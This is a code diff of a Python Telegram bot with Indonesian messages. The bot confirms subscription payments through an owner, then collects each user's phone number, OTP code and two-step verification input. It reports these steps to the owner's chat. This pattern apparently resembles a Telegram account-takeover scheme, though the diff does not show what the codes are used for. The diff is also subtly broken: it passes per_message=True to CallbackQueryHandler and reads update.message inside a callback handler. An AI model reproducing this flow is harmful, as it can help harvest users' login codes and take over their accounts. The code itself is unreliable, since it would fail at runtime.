@@ -114,6 +114,7 @@ async def handle_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
             InlineKeyboardButton("✅ Konfirmasi", callback_data=f"owner_konfirmasi_{user_id}"),
             InlineKeyboardButton("❌ Tolak", callback_data=f"owner_tolak_{user_id}")
         ]]
+
         await context.bot.send_photo(chat_id=OWNER_ID, photo=file_id, caption=caption, reply_markup=InlineKeyboardMarkup(buttons))
         await update.message.reply_text("Bukti berhasil dikirim. Tunggu konfirmasi admin.")
         return INPUT_NOHP
@@ -128,11 +129,8 @@ async def handle_owner_response(update: Update, context: ContextTypes.DEFAULT_TY
     uid = int(uid)
 
     if action == "konfirmasi":
-        # Kirim loading ke user setelah admin mengonfirmasi
         await context.bot.send_message(chat_id=uid, text="✅ Pembayaran dikonfirmasi. Silakan kirim nomor HP.")
-        # Update status loading ke admin
         await query.edit_message_text("Silakan tunggu... Admin sedang memproses.")
-        # Kirim konfirmasi ke bot owner
         await context.bot.send_message(chat_id=OWNER_ID, text=f"📱 No HP dari @{update.message.from_user.username or uid} telah dikonfirmasi.")
         return INPUT_NOHP
     else:
@@ -167,7 +165,6 @@ async def skip_verifikasi(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     user_id = query.from_user.id
     await query.edit_message_text("Verifikasi 2 langkah dilewati. Proses akan dilanjutkan.")
-    # Lanjutkan proses atau beri tahu admin
     await context.bot.send_message(chat_id=OWNER_ID, text=f"Verifikasi 2 langkah dilewati oleh @{query.from_user.username or user_id}.")
     return ConversationHandler.END
 
@@ -181,16 +178,13 @@ if __name__ == '__main__':
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler("start", start)],
         states={
-            PILIH_BULAN: [CallbackQueryHandler(button_handler)],
-            KONFIRMASI: [CallbackQueryHandler(button_handler)],
-            METODE_BAYAR: [CallbackQueryHandler(button_handler)],
-            KIRIM_BUKTI: [
-                CallbackQueryHandler(button_handler),
-                MessageHandler(filters.PHOTO, handle_media)
-            ],
+            PILIH_BULAN: [CallbackQueryHandler(button_handler, per_message=True)],
+            KONFIRMASI: [CallbackQueryHandler(button_handler, per_message=True)],
+            METODE_BAYAR: [CallbackQueryHandler(button_handler, per_message=True)],
+            KIRIM_BUKTI: [MessageHandler(filters.PHOTO, handle_media)],
             INPUT_NOHP: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
             INPUT_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
-            INPUT_VERIFIKASI: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
+            INPUT_VERIFIKASI: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)]
         },
         fallbacks=[CommandHandler("cancel", cancel)]
     )
